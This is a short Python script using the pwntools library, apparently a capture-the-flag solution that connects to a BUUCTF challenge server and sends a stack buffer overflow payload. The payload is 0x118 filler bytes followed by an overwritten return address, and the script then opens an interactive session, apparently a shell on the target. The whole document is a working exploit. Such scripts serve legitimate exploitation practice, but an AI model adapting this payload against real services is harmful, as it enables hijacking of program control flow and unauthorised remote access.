from pwn import *

sh=remote("node5.buuoj.cn",25840)
payload=0x118*b'a'+p64(0x0000000000401157)
sh.sendline(payload)

sh.interactive()
